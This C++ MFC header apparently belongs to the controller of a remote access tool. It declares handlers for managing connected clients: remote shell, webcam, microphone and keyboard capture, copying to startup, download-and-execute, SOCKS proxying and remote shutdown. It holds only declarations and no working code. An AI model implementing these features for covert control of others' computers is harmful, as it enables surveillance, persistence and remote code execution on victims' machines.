#pragma once
#include "afxcmn.h"

#define WM_CLIENT_LOGIN				(WM_USER + 401)
#define WM_CLIENT_LOGOUT			(WM_USER + 402)

#define WM_CLIENT_BLOCK				(WM_USER + 403)
#define WM_CLIENT_EDITCOMMENT		(WM_USER + 404)

#define WM_KERNEL_ERROR					(WM_USER + 405)
#define WM_KERNEL_UPDATE_UPLODA_STATU	(WM_USER + 406)

class CClientList :
	public CListCtrl
{
public:
	CClientList();
	~CClientList();
	DECLARE_MESSAGE_MAP()
	afx_msg int OnCreate(LPCREATESTRUCT lpCreateStruct);

	afx_msg LRESULT OnClientLogin(WPARAM wParam, LPARAM lParam);
	afx_msg LRESULT OnClientLogout(WPARAM wParam, LPARAM lParam);

	afx_msg LRESULT OnEditComment(WPARAM wParam, LPARAM lParam);
	afx_msg LRESULT OnKernelError(WPARAM error, LPARAM lParam);

	afx_msg LRESULT OnUpdateUploadStatu(WPARAM wParam,LPARAM lParam);

	afx_msg void OnNMRClick(NMHDR *pNMHDR, LRESULT *pResult);
	
	afx_msg void OnPowerReboot();
	afx_msg void OnPowerShutdown();
	afx_msg void OnSessionDisconnect();
	afx_msg void OnOperationEditcomment();

	afx_msg void OnOperationCmd();
	afx_msg void OnOperationChatbox();
	afx_msg void OnOperationFilemanager();
	afx_msg void OnOperationRemotedesktop();
	afx_msg void OnOperationCamera();
	afx_msg void OnSessionRestart();
	afx_msg void OnOperationMicrophone();


	afx_msg void OnOperationKeyboard();
	afx_msg void OnUtilsAddto();
	afx_msg void OnUtilsCopytostartup();
	afx_msg void OnUtilsDownloadandexec();
	afx_msg void OnProxySocksproxy();
	afx_msg void OnSessionExit();
};

